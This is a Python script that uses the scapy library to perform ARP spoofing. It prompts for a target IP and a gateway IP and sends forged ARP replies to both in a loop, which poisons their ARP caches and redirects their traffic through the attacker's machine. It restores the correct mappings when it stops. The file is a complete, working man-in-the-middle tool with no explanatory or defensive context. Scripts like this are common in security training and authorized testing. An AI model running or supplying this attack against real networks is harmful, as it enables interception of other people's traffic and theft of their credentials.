import scapy.all as scapy
import time
import sys
import logging

# Configure logging
logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)

def get_mac(ip):
    """
    Returns the MAC address for a given IP address.
    Exits if the MAC address cannot be found.
    """
    logging.info(f"Getting MAC address for IP: {ip}")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        mac_address = answered_list[0][1].hwsrc
        logging.info(f"Found MAC address: {mac_address} for IP: {ip}")
        return mac_address
    else:
        logging.error(f"Could not find MAC address for IP: {ip}. Exiting...")
        sys.exit(1)

def spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP packet to the target IP, impersonating the spoof IP.
    """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    logging.debug(f"Sent spoofed packet to {target_ip} pretending to be {spoof_ip}")

def restore(destination_ip, source_ip):
    """
    Restores the ARP table of the destination IP by sending the correct mapping of IP to MAC.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    logging.info(f"Restored ARP table for {destination_ip} with correct MAC: {source_mac}")

def main():
    # Get target and gateway IPs from user input
    target_ip = input("Enter the target IP address: ")
    gateway_ip = input("Enter the gateway IP address: ")
    
    try:
        sent_packets_count = 0
        logging.info("[*] Starting ARP spoofing...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            logging.info(f"[+] Packets sent: {sent_packets_count}")
            time.sleep(2)
    except KeyboardInterrupt:
        logging.info("\n[+] Detected CTRL + C ... Restoring ARP tables and quitting.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        logging.info("[+] ARP tables restored. Exiting.")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        sys.exit(1)

if __name__ == "__main__":
    main()

#### python3 ARP_SPOOFING1.py